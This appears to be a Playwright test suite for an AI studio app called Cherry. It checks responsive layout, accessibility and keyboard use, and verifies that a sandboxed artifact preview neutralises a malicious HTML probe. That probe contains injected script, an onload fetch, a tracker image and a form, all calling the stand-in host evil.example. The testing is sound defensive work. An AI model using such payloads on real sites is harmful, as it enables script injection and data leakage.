import { expect, test } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';

const VIEWPORTS = [
  { name: 'mobile', width: 390, height: 844 },
  { name: 'tablet', width: 834, height: 1194 },
  { name: 'laptop', width: 1280, height: 800 },
  { name: 'desktop', width: 1440, height: 1024 },
];

test.describe('responsive and accessible shell', () => {
  for (const viewport of VIEWPORTS) {
    test(`landing and studio render without horizontal overflow at ${viewport.name}`, async ({ page }) => {
      await page.setViewportSize({ width: viewport.width, height: viewport.height });
      await page.goto('/');
      await expect(page.getByRole('heading', { name: /One task. An entire AI team./i })).toBeVisible();
      const landingOverflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
      expect(landingOverflow, 'landing horizontal overflow').toBeLessThanOrEqual(1);

      await page.goto('/studio');
      await expect(page.getByRole('heading', { name: 'Teach Cherry something' })).toBeVisible();
      const studioOverflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
      expect(studioOverflow, 'studio horizontal overflow').toBeLessThanOrEqual(1);
    });
  }

  test('showcase renders without horizontal overflow at mobile', async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 844 });
    await page.goto('/showcase');
    await expect(page.getByRole('heading', { name: 'Watch a lesson become a proven skill' })).toBeVisible();
    const showcaseOverflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
    expect(showcaseOverflow, 'showcase horizontal overflow').toBeLessThanOrEqual(1);
  });

  test('mobile shows bottom navigation instead of the rail', async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 844 });
    await page.goto('/studio');
    await expect(page.getByRole('navigation', { name: 'Studio sections (mobile)' })).toBeVisible();
    await expect(page.getByRole('navigation', { name: 'Studio sections', exact: true })).toBeHidden();
  });

  test('landing has no serious axe violations', async ({ page }) => {
    await page.goto('/');
    const results = await new AxeBuilder({ page }).analyze();
    const serious = results.violations.filter((violation) => violation.impact === 'serious' || violation.impact === 'critical');
    expect(serious.map((violation) => `${violation.id}: ${violation.help}`)).toEqual([]);
  });

  test('studio empty state has no serious axe violations', async ({ page }) => {
    await page.goto('/studio');
    await expect(page.getByRole('heading', { name: 'Teach Cherry something' })).toBeVisible();
    const results = await new AxeBuilder({ page }).analyze();
    const serious = results.violations.filter((violation) => violation.impact === 'serious' || violation.impact === 'critical');
    expect(serious.map((violation) => `${violation.id}: ${violation.help}`)).toEqual([]);
  });

  test('keyboard-only: workspace creation works without a mouse', async ({ page }) => {
    await page.goto('/studio');
    await page.getByLabel('Space name').focus();
    await page.keyboard.type('Keyboard workspace');
    await page.keyboard.press('Enter');
    await expect(page.getByRole('heading', { name: 'Command Center' })).toBeVisible();
  });
});

test.describe('artifact preview isolation', () => {
  test('malicious artifact is rendered as static content with no navigation or network', async ({ page }) => {
    const blockedRequests: string[] = [];
    page.on('request', (request) => {
      if (request.url().includes('evil.example')) blockedRequests.push(request.url());
    });
    await page.goto('/studio');
    await page.getByLabel('Space name').fill('Sandbox test');
    await page.getByRole('button', { name: 'Create space' }).click();
    await page.getByRole('link', { name: 'Create project' }).first().click();
    await page.getByLabel('Title').fill('Sandbox mission');
    await page.getByLabel('Objective').fill('Prove the preview sandbox holds');
    await page.getByLabel('Definition of done (one item per line)').fill('sandbox holds');
    await page.getByRole('button', { name: 'Create project' }).click();
    await page.getByRole('button', { name: 'Create files' }).click();
    await page.getByRole('link', { name: 'Open files' }).click();

    await page.locator('input[name="path"]').fill('index.html');
    await page.getByRole('button', { name: 'Create file' }).click();
    await page.getByTestId('artifact-editor').fill(
      [
        '<html lang="en"><head><title>evil</title><link rel="stylesheet" href="https://evil.example/evil.css"></head>',
        '<body onload="fetch(\'https://evil.example/load\')"><h1>probe</h1>',
        '<a href="https://evil.example/navigate">leave</a><img src="https://evil.example/tracker.gif">',
        '<form action="https://evil.example/submit"><button type="submit">submit</button></form>',
        '<script>document.body.textContent = "executed"; fetch("https://evil.example/script");</script>',
        '</body></html>',
      ].join('\n'),
    );
    await page.getByTestId('save-artifact').click();

    const preview = page.getByTestId('artifact-preview');
    await expect(preview).toHaveAttribute('sandbox', '');
    await expect(preview).toHaveAttribute('referrerpolicy', 'no-referrer');
    const srcdoc = await preview.getAttribute('srcdoc');
    expect(srcdoc).toBeTruthy();
    expect(srcdoc!.startsWith('<meta http-equiv="Content-Security-Policy"')).toBe(true);
    expect(srcdoc).toContain("script-src 'none'");
    expect(srcdoc).not.toMatch(/<script\b/i);
    expect(srcdoc).not.toMatch(/\bon[a-z]+\s*=/i);
    expect(srcdoc).not.toContain('evil.example');
    await expect(preview.contentFrame().locator('h1')).toHaveText('probe');
    await expect(preview.contentFrame().locator('body')).not.toContainText('executed');
    expect(blockedRequests).toEqual([]);
    // Cherry itself is untouched: still on our origin, workspace intact.
    await expect(page).toHaveURL(/\/studio\/artifacts\//);
  });
});
